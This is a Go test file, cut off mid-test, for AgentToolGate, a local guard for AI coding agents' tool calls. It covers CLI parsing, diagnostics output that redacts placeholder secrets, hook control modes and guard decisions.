package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"time"

	"agenttoolgate/backend/internal/config"
	"agenttoolgate/backend/internal/guard"
)

func TestParseServeArgsSupportsOpenFlag(t *testing.T) {
	if !parseServeArgs([]string{"serve", "--open"}) {
		t.Fatalf("expected serve --open to enable browser opening")
	}
	if !parseServeArgs([]string{"--open"}) {
		t.Fatalf("expected --open to enable browser opening")
	}
	if !parseServeArgs([]string{"--", "--open"}) {
		t.Fatalf("expected go run separator followed by --open to enable browser opening")
	}
	if parseServeArgs([]string{"serve"}) {
		t.Fatalf("serve without --open must not open browser")
	}
}

func TestParseCommandArgsSupportsDoctorAndListenOverrides(t *testing.T) {
	opts, err := parseCommandArgs([]string{"doctor", "--addr", "127.0.0.1:8090"})
	if err != nil {
		t.Fatalf("parse doctor args: %v", err)
	}
	if opts.Command != "doctor" || opts.Addr != "127.0.0.1:8090" {
		t.Fatalf("unexpected doctor opts: %+v", opts)
	}

	cfg := config.Config{Host: "127.0.0.1", Port: "8080"}
	if err := applyListenOptions(&cfg, opts); err != nil {
		t.Fatalf("apply addr: %v", err)
	}
	if cfg.Host != "127.0.0.1" || cfg.Port != "8090" {
		t.Fatalf("unexpected listen cfg after addr: host=%q port=%q", cfg.Host, cfg.Port)
	}

	opts, err = parseCommandArgs([]string{"--port=8091"})
	if err != nil {
		t.Fatalf("parse port args: %v", err)
	}
	if err := applyListenOptions(&cfg, opts); err != nil {
		t.Fatalf("apply port: %v", err)
	}
	if cfg.Port != "8091" {
		t.Fatalf("expected port override, got %q", cfg.Port)
	}
}

func TestParseCommandArgsRejectsInvalidPort(t *testing.T) {
	opts, err := parseCommandArgs([]string{"--port", "70000"})
	if err != nil {
		t.Fatalf("parse should defer numeric validation to applyListenOptions: %v", err)
	}
	err = applyListenOptions(&config.Config{Host: "127.0.0.1", Port: "8080"}, opts)
	if err == nil || !strings.Contains(err.Error(), "1-65535") {
		t.Fatalf("expected port validation error, got %v", err)
	}
}

func TestParseCommandArgsSupportsCodexHookRefresh(t *testing.T) {
	opts, err := parseCommandArgs([]string{"init", "codex", "--refresh-hooks", "--dir", "project"})
	if err != nil {
		t.Fatalf("parse init refresh args: %v", err)
	}
	if opts.Command != "init" || opts.InitTarget != projectInitModeCodex || !opts.RefreshHooks || opts.Dir != "project" {
		t.Fatalf("unexpected init refresh opts: %+v", opts)
	}
}

func TestParseCommandArgsRejectsHookRefreshOutsideInit(t *testing.T) {
	if _, err := parseCommandArgs([]string{"doctor", "--refresh-hooks"}); err == nil || !strings.Contains(err.Error(), "仅适用于 init codex") {
		t.Fatalf("expected scoped refresh error, got %v", err)
	}
}

func TestParseCommandArgsRejectsMultipleSubcommands(t *testing.T) {
	for _, args := range [][]string{
		{"doctor", "init", "codex"},
		{"serve", "up"},
		{"init", "codex", "doctor"},
	} {
		if _, err := parseCommandArgs(args); err == nil || !strings.Contains(err.Error(), "一次只能指定一个子命令") {
			t.Fatalf("args=%v expected multiple command error, got %v", args, err)
		}
	}
}

func TestRunDoctorUsesProjectPort(t *testing.T) {
	project := t.TempDir()
	if err := os.MkdirAll(filepath.Dir(projectConfigPath(project)), 0o700); err != nil {
		t.Fatalf("create project config dir: %v", err)
	}
	config := `{
  "host": "127.0.0.1",
  "port": 18091,
  "workspace": {"name":"Demo","slug":"demo","orgId":"demo-org"},
  "hookMode": "off",
  "openBrowser": false
}
`
	if err := os.WriteFile(projectConfigPath(project), []byte(config), 0o600); err != nil {
		t.Fatalf("write project config: %v", err)
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"doctor", "--dir", project}, &stdout, &stderr); code != 0 {
		t.Fatalf("doctor returned %d stderr=%s", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), "http://127.0.0.1:18091") {
		t.Fatalf("doctor did not use project port:\n%s", stdout.String())
	}
}

func TestRunDoctorAppliesProjectPortBeforeValidatingEnvironment(t *testing.T) {
	project := t.TempDir()
	if err := os.MkdirAll(filepath.Dir(projectConfigPath(project)), 0o700); err != nil {
		t.Fatalf("create project config dir: %v", err)
	}
	config := `{
  "host": "127.0.0.1",
  "port": 18093,
  "workspace": {"name":"Demo","slug":"demo","orgId":"demo-org"},
  "hookMode": "off",
  "openBrowser": false
}
`
	if err := os.WriteFile(projectConfigPath(project), []byte(config), 0o600); err != nil {
		t.Fatalf("write project config: %v", err)
	}
	t.Setenv("PORT", "invalid")

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"doctor", "--dir", project}, &stdout, &stderr); code != 0 {
		t.Fatalf("doctor returned %d stderr=%s", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), "http://127.0.0.1:18093") {
		t.Fatalf("doctor did not replace invalid environment port with project config:\n%s", stdout.String())
	}
}

func TestRunDoctorWithoutProjectConfigKeepsEnvironmentPort(t *testing.T) {
	project := t.TempDir()
	t.Setenv("PORT", "18092")

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"doctor", "--dir", project}, &stdout, &stderr); code != 0 {
		t.Fatalf("doctor returned %d stderr=%s", code, stderr.String())
	}
	if !strings.Contains(stdout.String(), "http://127.0.0.1:18092") {
		t.Fatalf("doctor did not preserve environment port:\n%s", stdout.String())
	}
}

func TestDiagnosticsAndStartupSummaryRedactSensitiveConfig(t *testing.T) {
	cfg := config.Config{
		Host:                       "127.0.0.1",
		Port:                       "8080",
		StoreDriver:                "sqlite",
		SQLitePath:                 filepath.Join(t.TempDir(), "agenttoolgate.db"),
		DatabaseURL:                "postgres://user:super-secret@127.0.0.1:5432/agenttoolgate",
		DatabaseQueryURL:           "postgres://user:super-secret@127.0.0.1:5432/query",
		GitHubToken:                "ghp_super_secret_token",
		HTTPAllowedHosts:           []string{"127.0.0.1:18080"},
		HTTPAllowedMethods:         []string{"GET", "POST"},
		AuthMode:                   "local",
		DefaultWorkspaceOrgID:      "local-org",
		DefaultWorkspaceSlug:       "default",
		DatabaseQueryDatasource:    "local_postgres",
		GitHubAPIBaseURL:           "https://api.github.com",
		DatabaseQueryAllowedTables: []string{"public.tools"},
	}

	diagnostics := formatDiagnostics(cfg, true)
	startup := formatStartupSummary(cfg, publicListenURL(cfg), true)
	combined := diagnostics + startup
	for _, leaked := range []string{"super-secret", "ghp_super_secret_token"} {
		if strings.Contains(combined, leaked) {
			t.Fatalf("summary leaked sensitive value %q:\n%s", leaked, combined)
		}
	}
	if !strings.Contains(diagnostics, "GitHub token: configured") {
		t.Fatalf("expected github token configured status, got:\n%s", diagnostics)
	}
	if !strings.Contains(diagnostics, "MCP Streamable HTTP URL: http://127.0.0.1:8080/mcp") ||
		!strings.Contains(diagnostics, "MCP SSE URL: http://127.0.0.1:8080/mcp/sse") ||
		!strings.Contains(diagnostics, "Workspace header: X-Workspace-Org-Id: local-org") ||
		!strings.Contains(diagnostics, "docs/ai-client-integration.md") {
		t.Fatalf("doctor output missing AI client MCP hints:\n%s", diagnostics)
	}
	if !strings.Contains(startup, "AgentToolGate 已启动") || !strings.Contains(startup, "本地诊断: agenttoolgate.exe doctor") {
		t.Fatalf("startup summary missing first-run hints:\n%s", startup)
	}
	if !strings.Contains(startup, "AI 客户端接入: docs/ai-client-integration.md") {
		t.Fatalf("startup summary missing AI client doc hint:\n%s", startup)
	}
	if !strings.Contains(startup, "项目接入: 目标项目运行 agenttoolgate.exe init all") ||
		!strings.Contains(diagnostics, "项目接入: 目标项目先运行 agenttoolgate.exe init all") {
		t.Fatalf("startup/doctor output missing project init hints:\nstartup=%s\ndoctor=%s", startup, diagnostics)
	}
	if !strings.Contains(startup, "MCP Streamable HTTP: http://127.0.0.1:8080/mcp") ||
		!strings.Contains(startup, "MCP SSE: http://127.0.0.1:8080/mcp/sse") {
		t.Fatalf("startup summary missing MCP endpoints:\n%s", startup)
	}
}

func TestListenFailureMessageSuggestsPortOverride(t *testing.T) {
	message := listenFailureMessage("127.0.0.1:8080", context.Canceled)
	if !strings.Contains(message, "--port 8090") || !strings.Contains(message, "PORT=8090") {
		t.Fatalf("listen failure message should suggest port override, got:\n%s", message)
	}
}

func TestRunDoctorDoesNotStartServerOrLeakSecrets(t *testing.T) {
	t.Setenv("STORE_DRIVER", "sqlite")
	t.Setenv("DATABASE_URL", "postgres://user:secret-password@127.0.0.1:5432/agenttoolgate")
	t.Setenv("DATABASE_QUERY_URL", "postgres://user:query-password@127.0.0.1:5432/query")
	t.Setenv("GITHUB_TOKEN", "ghp_should_not_print")
	t.Setenv("AGT_SQLITE_PATH", filepath.Join(t.TempDir(), "agenttoolgate.db"))

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"doctor", "--port", "8099"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("doctor returned %d stderr=%s", code, stderr.String())
	}
	output := stdout.String()
	if !strings.Contains(output, "AgentToolGate 本地诊断") || !strings.Contains(output, "监听地址: 127.0.0.1:8099") {
		t.Fatalf("unexpected doctor output:\n%s", output)
	}
	if !strings.Contains(output, "MCP Streamable HTTP URL: http://127.0.0.1:8099/mcp") ||
		!strings.Contains(output, "MCP SSE URL: http://127.0.0.1:8099/mcp/sse") ||
		!strings.Contains(output, "Workspace header: X-Workspace-Org-Id: local-org") {
		t.Fatalf("doctor output missing MCP inbound connection hints:\n%s", output)
	}
	if !strings.Contains(output, "项目接入: 目标项目先运行 agenttoolgate.exe init all") {
		t.Fatalf("doctor output missing project init next step:\n%s", output)
	}
	for _, leaked := range []string{"secret-password", "query-password", "ghp_should_not_print"} {
		if strings.Contains(output, leaked) {
			t.Fatalf("doctor leaked sensitive value %q:\n%s", leaked, output)
		}
	}
}

func TestRunHookControlStatusDefaultsToOff(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create .git: %v", err)
	}
	t.Chdir(repo)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"hook", "control", "status"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("hook control status returned %d stderr=%s", code, stderr.String())
	}
	output := stdout.String()
	if !strings.Contains(output, "mode: off") {
		t.Fatalf("expected missing control file to report off, got:\n%s", output)
	}
	if !strings.Contains(output, filepath.Join(repo, ".tmp", "agenttoolgate", "hook-control.json")) {
		t.Fatalf("expected repo-local control path, got:\n%s", output)
	}
}

func TestRunHookControlStatusRejectsInvalidExistingControl(t *testing.T) {
	tests := []struct {
		name string
		raw  string
	}{
		{name: "invalid json", raw: `{"mode":`},
		{name: "unknown mode", raw: `{"mode":"preview"}`},
		{name: "duplicate mode", raw: `{"mode":"live","mode":"off"}`},
		{name: "case alias duplicate mode", raw: `{"mode":"live","Mode":"off"}`},
		{name: "case alias mode", raw: `{"Mode":"live"}`},
		{name: "unknown field", raw: `{"mode":"live","unexpected":true}`},
		{name: "external endpoint", raw: `{"mode":"live","endpoint":"https://example.com:443"}`},
		{name: "relative executable", raw: `{"mode":"live","executable":"agenttoolgate.exe"}`},
		{name: "wrong mode type", raw: `{"mode":true}`},
		{name: "array root", raw: `[{"mode":"live"}]`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			repo := t.TempDir()
			if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
				t.Fatalf("create .git: %v", err)
			}
			if err := os.MkdirAll(filepath.Dir(hookControlPath(repo)), 0o700); err != nil {
				t.Fatalf("create hook control directory: %v", err)
			}
			if err := os.WriteFile(hookControlPath(repo), []byte(tc.raw), 0o600); err != nil {
				t.Fatalf("write hook control: %v", err)
			}
			t.Chdir(repo)

			var stdout bytes.Buffer
			var stderr bytes.Buffer
			if code := run([]string{"hook", "control", "status"}, &stdout, &stderr); code != 2 {
				t.Fatalf("invalid control status must fail, code=%d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
			}
			if stdout.Len() != 0 || !strings.Contains(stderr.String(), "hook control") {
				t.Fatalf("invalid control must report an explicit error, stdout=%s stderr=%s", stdout.String(), stderr.String())
			}
		})
	}
}

func TestRunHookControlOffRecoversInvalidControl(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create .git: %v", err)
	}
	if err := os.MkdirAll(filepath.Dir(hookControlPath(repo)), 0o700); err != nil {
		t.Fatalf("create hook control directory: %v", err)
	}
	if err := os.WriteFile(hookControlPath(repo), []byte(`{"mode":"unknown"}`), 0o600); err != nil {
		t.Fatalf("write invalid hook control: %v", err)
	}
	t.Chdir(repo)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"hook", "control", "off", "--reason", "recover development"}, &stdout, &stderr); code != 0 {
		t.Fatalf("off must recover invalid control, code=%d stderr=%s", code, stderr.String())
	}
	doc, err := readHookControlDocument(repo)
	if err != nil {
		t.Fatalf("read recovered hook control: %v", err)
	}
	if doc.Mode != projectHookModeOff || doc.Reason != "recover development" {
		t.Fatalf("unexpected recovered control: %+v", doc)
	}
	if doc.Endpoint != "" || doc.Executable != "" {
		t.Fatalf("off control must not retain runtime metadata: %+v", doc)
	}
}

func TestRunHookControlWritesRepoLocalControlFile(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create .git: %v", err)
	}
	if _, err := writeProjectInitFiles(repo, projectInitModeCodex); err != nil {
		t.Fatalf("install current Codex adapter: %v", err)
	}
	subdir := filepath.Join(repo, "backend")
	if err := os.Mkdir(subdir, 0o700); err != nil {
		t.Fatalf("create subdir: %v", err)
	}
	t.Chdir(subdir)

	cases := []string{"live", "dry-run", "off"}
	for _, mode := range cases {
		var stdout bytes.Buffer
		var stderr bytes.Buffer
		code := run([]string{"hook", "control", mode, "--reason", "test session"}, &stdout, &stderr)
		if code != 0 {
			t.Fatalf("hook control %s returned %d stderr=%s", mode, code, stderr.String())
		}
		if !strings.Contains(stdout.String(), "mode: "+mode) || !strings.Contains(stdout.String(), "reason: test session") {
			t.Fatalf("unexpected hook control output for %s:\n%s", mode, stdout.String())
		}

		raw, err := os.ReadFile(filepath.Join(repo, ".tmp", "agenttoolgate", "hook-control.json"))
		if err != nil {
			t.Fatalf("read hook control file: %v", err)
		}
		var doc hookControlDocument
		if err := json.Unmarshal(raw, &doc); err != nil {
			t.Fatalf("decode hook control file: %v content=%s", err, string(raw))
		}
		if doc.Mode != mode || doc.Reason != "test session" || strings.TrimSpace(doc.UpdatedAt) == "" {
			t.Fatalf("unexpected hook control doc: %+v", doc)
		}
		if mode == projectHookModeOff && (doc.Endpoint != "" || doc.Executable != "") {
			t.Fatalf("off control must not contain runtime metadata: %+v", doc)
		}
		if mode != projectHookModeOff && doc.Executable == "" {
			t.Fatalf("enabled control must contain the current executable: %+v", doc)
		}
	}
}

func TestRunHookControlKeepsLegacyAdapterSchemaCompatible(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create .git: %v", err)
	}
	adapterPath := projectCodexHookAdapterPath(repo)
	if err := os.MkdirAll(filepath.Dir(adapterPath), 0o700); err != nil {
		t.Fatalf("create adapter directory: %v", err)
	}
	if err := os.WriteFile(adapterPath, []byte("# older adapter with strict three-field control schema\n"), 0o600); err != nil {
		t.Fatalf("write older adapter: %v", err)
	}
	t.Chdir(repo)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"hook", "control", "live", "--reason", "upgrade compatibility"}, &stdout, &stderr); code != 0 {
		t.Fatalf("hook control live returned %d stderr=%s", code, stderr.String())
	}
	raw, err := os.ReadFile(projectHookControlPath(repo))
	if err != nil {
		t.Fatalf("read hook control: %v", err)
	}
	var fields map[string]json.RawMessage
	if err := json.Unmarshal(raw, &fields); err != nil {
		t.Fatalf("decode hook control: %v", err)
	}
	for _, field := range []string{"endpoint", "executable"} {
		if _, ok := fields[field]; ok {
			t.Fatalf("legacy adapter control must not contain %s: %s", field, raw)
		}
	}
	if !strings.Contains(stdout.String(), "mode: live") {
		t.Fatalf("unexpected hook control output: %s", stdout.String())
	}
}

func TestRunHookControlValidatesProjectProtectionBeforeEnabling(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create .git: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".agenttoolgate"), 0o700); err != nil {
		t.Fatalf("create project config directory: %v", err)
	}
	if err := os.WriteFile(projectProtectedPath(repo), []byte(`{"version":1,"localActionFirewall":{"enabled":true,"unknown":true}}`), 0o600); err != nil {
		t.Fatalf("write invalid project protection: %v", err)
	}
	t.Chdir(repo)

	for _, mode := range []string{"dry-run", "live"} {
		var stdout bytes.Buffer
		var stderr bytes.Buffer
		if code := run([]string{"hook", "control", mode}, &stdout, &stderr); code != 2 {
			t.Fatalf("invalid project protection must reject %s, code=%d stdout=%s stderr=%s", mode, code, stdout.String(), stderr.String())
		}
		if _, err := os.Stat(hookControlPath(repo)); !os.IsNotExist(err) {
			t.Fatalf("invalid project protection must not write %s control, err=%v", mode, err)
		}
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"hook", "control", "off"}, &stdout, &stderr); code != 0 {
		t.Fatalf("off must remain available for recovery, code=%d stderr=%s", code, stderr.String())
	}
}

func TestOpenStoreSupportsSQLite(t *testing.T) {
	st, err := openStore(context.Background(), config.Config{
		StoreDriver: "sqlite",
		SQLitePath:  filepath.Join(t.TempDir(), "agenttoolgate.db"),
	})
	if err != nil {
		t.Fatalf("open sqlite store: %v", err)
	}
	if closer, ok := st.(interface{ Close() }); ok {
		t.Cleanup(closer.Close)
	}
	if err := st.Ping(context.Background()); err != nil {
		t.Fatalf("ping sqlite store: %v", err)
	}
}

func TestRunGuardEvaluatePrintsDecisionJSON(t *testing.T) {
	inputPath := filepath.Join(t.TempDir(), "action.json")
	payload, err := json.Marshal(map[string]any{
		"toolName":      "Bash",
		"actionType":    "command",
		"command":       "git status",
		"cwd":           `F:\\workspace\\AgentToolGate`,
		"projectRoot":   `F:\\workspace\\AgentToolGate`,
		"networkMethod": "GET",
		"networkUrl":    "https://github.com/openai/openai-go",
	})
	if err != nil {
		t.Fatalf("marshal action input: %v", err)
	}
	if err := os.WriteFile(inputPath, payload, 0o600); err != nil {
		t.Fatalf("write action input: %v", err)
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "evaluate", "--input", inputPath}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard evaluate returned %d stderr=%s", code, stderr.String())
	}
	output := stdout.String()
	if !strings.Contains(output, `"decision":"allow"`) || !strings.Contains(output, `"silent":true`) {
		t.Fatalf("unexpected guard output: %s", output)
	}
	if strings.Contains(stderr.String(), "server") {
		t.Fatalf("guard evaluate should not start server: stderr=%s", stderr.String())
	}
}

func TestRunGuardEvaluateRejectsMissingInput(t *testing.T) {
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "evaluate"}, &stdout, &stderr)
	if code != 2 {
		t.Fatalf("expected usage error, got code=%d stderr=%s", code, stderr.String())
	}
	if !strings.Contains(stderr.String(), "--input") {
		t.Fatalf("expected input hint in stderr, got %s", stderr.String())
	}
}

func TestRunGuardAdaptPrintsDryRunResultJSON(t *testing.T) {
	inputPath := filepath.Join("..", "..", "..", "examples", "guard-hooks", "claude", "bash-git-status.json")

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "adapt", "claude", "--input", inputPath}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard adapt returned %d stderr=%s", code, stderr.String())
	}
	var result guard.AdapterResult
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("decode adapter result: %v output=%s", err, stdout.String())
	}
	if result.Client != "claude" || result.Mode != guard.AdapterModeDryRun || result.Decision != "allow" || result.WouldBlock || result.WouldAsk || !result.Silent {
		t.Fatalf("unexpected adapter result: %+v", result)
	}
	if strings.Contains(stdout.String(), "git status") {
		t.Fatalf("adapter output should not include raw command: %s", stdout.String())
	}
	if strings.Contains(stderr.String(), "server") {
		t.Fatalf("guard adapt should not start server: stderr=%s", stderr.String())
	}
}

func TestRunGuardAdaptSupportsEnforceMode(t *testing.T) {
	inputPath := filepath.Join("..", "..", "..", "examples", "guard-hooks", "codex", "bash-rm-root.json")

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "adapt", "codex", "--input", inputPath, "--mode", "enforce"}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard adapt enforce returned %d stderr=%s", code, stderr.String())
	}
	var result guard.AdapterResult
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("decode adapter result: %v output=%s", err, stdout.String())
	}
	if result.Mode != guard.AdapterModeEnforce || result.Decision != "deny" || !result.WouldBlock {
		t.Fatalf("unexpected enforce adapter result: %+v", result)
	}
}

func TestRunGuardAdaptRejectsInvalidJSON(t *testing.T) {
	inputPath := filepath.Join(t.TempDir(), "payload.json")
	if err := os.WriteFile(inputPath, []byte(`{"tool_name":`), 0o600); err != nil {
		t.Fatalf("write invalid payload: %v", err)
	}

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "adapt", "claude", "--input", inputPath}, &stdout, &stderr)
	if code == 0 {
		t.Fatalf("expected invalid JSON to fail")
	}
	if !strings.Contains(stderr.String(), "JSON 无效") || stdout.Len() != 0 {
		t.Fatalf("expected concise invalid JSON error, stdout=%s stderr=%s", stdout.String(), stderr.String())
	}
}

func TestRunGuardHookClaudePrintsOfficialHookOutput(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	inputPath := writeHookPayloadForRepo(t, repo, "Bash", map[string]any{"command": "git status"})
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		writeHookDecisionResponse(t, w, map[string]any{"decision": "allow", "reason": "safe"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"--", "guard", "hook", "claude", "--input", inputPath}, &stdout, &stderr)
	if code != 0 {
		t.Fatalf("guard hook returned %d stderr=%s", code, stderr.String())
	}
	var result guard.ClaudeHookOutput
	if err := json.Unmarshal(stdout.Bytes(), &result); err != nil {
		t.Fatalf("decode hook output: %v output=%s", err, stdout.String())
	}
	specific := result.HookSpecificOutput
	if specific.HookEventName != "PreToolUse" || specific.PermissionDecision != "allow" || specific.PermissionDecisionReason != "" {
		t.Fatalf("unexpected hook output: %+v", result)
	}
	if strings.Contains(stdout.String(), "git status") {
		t.Fatalf("allow hook output should not include raw command: %s", stdout.String())
	}
	if strings.Contains(stderr.String(), "server") {
		t.Fatalf("guard hook should not start server: stderr=%s", stderr.String())
	}
}

func TestRunGuardHookHonorsRepoControlAndCallsBackendInLiveMode(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := os.WriteFile(filepath.Join(repo, "README.md"), []byte("hello"), 0o600); err != nil {
		t.Fatalf("write ordinary read target: %v", err)
	}
	inputPath := writeHookPayloadForRepo(t, repo, "Read", map[string]any{"file_path": "README.md"})

	requests := 0
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requests++
		writeHookDecisionResponse(t, w, map[string]any{"decision": "allow", "reason": "safe"})
	}))
	t.Cleanup(server.Close)
	t.Setenv("AGENTTOOLGATE_URL", server.URL)
	t.Setenv("TRELLIS_HOOKS", "1")
	t.Setenv("TRELLIS_DISABLE_HOOKS", "0")

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr)
	if code != 0 || stdout.Len() != 0 || requests != 0 {
		t.Fatalf("missing control must no-op, code=%d requests=%d stdout=%s stderr=%s", code, requests, stdout.String(), stderr.String())
	}

	if err := writeProjectHookControl(repo, projectHookModeDryRun); err != nil {
		t.Fatalf("write dry-run control: %v", err)
	}
	code = run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr)
	if code != 0 || stdout.Len() != 0 || requests != 0 {
		t.Fatalf("dry-run must not call backend, code=%d requests=%d stdout=%s stderr=%s", code, requests, stdout.String(), stderr.String())
	}
	if _, err := os.Stat(filepath.Join(repo, ".tmp", "agenttoolgate", "hook-dry-run.jsonl")); !os.IsNotExist(err) {
		t.Fatalf("ordinary repo read should not add dry-run noise, got err=%v", err)
	}

	if err := writeProjectHookControl(repo, projectHookModeLive); err != nil {
		t.Fatalf("write live control: %v", err)
	}
	code = run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr)
	if code != 0 || stdout.Len() != 0 || requests != 0 {
		t.Fatalf("ordinary repo read must use the local fast path, code=%d requests=%d stdout=%s stderr=%s", code, requests, stdout.String(), stderr.String())
	}
}

func TestRunGuardHookDryRunPreviewsProjectProtectionWithoutBlocking(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".agenttoolgate"), 0o700); err != nil {
		t.Fatalf("create project config directory: %v", err)
	}
	protected := `{
		"version":1,
		"localActionFirewall":{
			"enabled":true,
			"protectedPaths":[{"pattern":"src/core/**","read":"require_approval","reason":"核心算法目录"}],
			"egress":{"enabled":false}
		}
	}`
	if err := os.WriteFile(projectProtectedPath(repo), []byte(protected), 0o600); err != nil {
		t.Fatalf("write project protection: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeDryRun); err != nil {
		t.Fatalf("write dry-run control: %v", err)
	}
	inputPath := writeHookPayloadForRepo(t, repo, "Read", map[string]any{"file_path": "src/core/algorithm.go"})

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr); code != 0 || stdout.Len() != 0 {
		t.Fatalf("dry-run must not block, code=%d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
	}
	raw, err := os.ReadFile(filepath.Join(repo, ".tmp", "agenttoolgate", "hook-dry-run.jsonl"))
	if err != nil {
		t.Fatalf("read dry-run preview: %v", err)
	}
	var preview map[string]any
	if err := json.Unmarshal(bytes.TrimSpace(raw), &preview); err != nil {
		t.Fatalf("decode dry-run preview: %v content=%s", err, string(raw))
	}
	if preview["riskLevel"] != "high" || preview["decisionPreview"] != "ask" {
		t.Fatalf("protected read must preview a high-risk approval, got %+v", preview)
	}
}

func TestRunGuardHookDryRunPreviewsInvalidProjectProtectionWithoutBlocking(t *testing.T) {
	repo := t.TempDir()
	if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
		t.Fatalf("create git marker: %v", err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".agenttoolgate"), 0o700); err != nil {
		t.Fatalf("create project config directory: %v", err)
	}
	if err := os.WriteFile(projectProtectedPath(repo), []byte(`{"version":1,"localActionFirewall":{"enabled":true,"unknown":true}}`), 0o600); err != nil {
		t.Fatalf("write invalid project protection: %v", err)
	}
	if err := writeProjectHookControl(repo, projectHookModeDryRun); err != nil {
		t.Fatalf("write dry-run control: %v", err)
	}
	inputPath := writeHookPayloadForRepo(t, repo, "Read", map[string]any{"file_path": "README.md"})

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	if code := run([]string{"guard", "hook", "codex", "--input", inputPath}, &stdout, &stderr); code != 0 || stdout.Len() != 0 {
		t.Fatalf("invalid config in dry-run must not block, code=%d stdout=%s stderr=%s", code, stdout.String(), stderr.String())
	}
	raw, err := os.ReadFile(filepath.Join(repo, ".tmp", "agenttoolgate", "hook-dry-run.jsonl"))
	if err != nil {
		t.Fatalf("read dry-run preview: %v", err)
	}
	var preview map[string]any
	if err := json.Unmarshal(bytes.TrimSpace(raw), &preview); err != nil {
		t.Fatalf("decode dry-run preview: %v content=%s", err, string(raw))
	}
	signals, _ := preview["signals"].([]any)
	if preview["riskLevel"] != "high" || preview["decisionPreview"] != "deny" || len(signals) == 0 || signals[0] != "project_protection_config_invalid" {
		t.Fatalf("invalid config must preview a live block, got %+v", preview)
	}
}

func TestRunGuardHookFailsClosedForInvalidControl(t *testing.T) {
	tests := []struct {
		name string
		raw  string
	}{
		{name: "invalid json", raw: `{"mode":`},
		{name: "unknown mode", raw: `{"mode":"preview"}`},
		{name: "duplicate mode", raw: `{"mode":"live","mode":"off"}`},
		{name: "case alias mode", raw: `{"Mode":"live"}`},
		{name: "unknown field", raw: `{"mode":"live","unexpected":true}`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			repo := t.TempDir()
			if err := os.Mkdir(filepath.Join(repo, ".git"), 0o700); err != nil {
				t.Fatalf("create git marker: %v", err)
			}
			if err := os.MkdirAll(filepath.Dir(hookControlPath(repo)), 0o700); err != nil {
				t.Fatalf("create hook control directory: %v", err)
			}
			if err := os.WriteFile(hookControlPath(repo), []byte(tc.raw), 0o600); err != nil {
				t.Fatalf("write hook control: %v", err)
			}
			inputPath := writeHookPayloadForRepo(t, repo, "shell", map[string]any{"command": "git status"})
			t.Setenv("TRELLIS_HOOKS", "1")
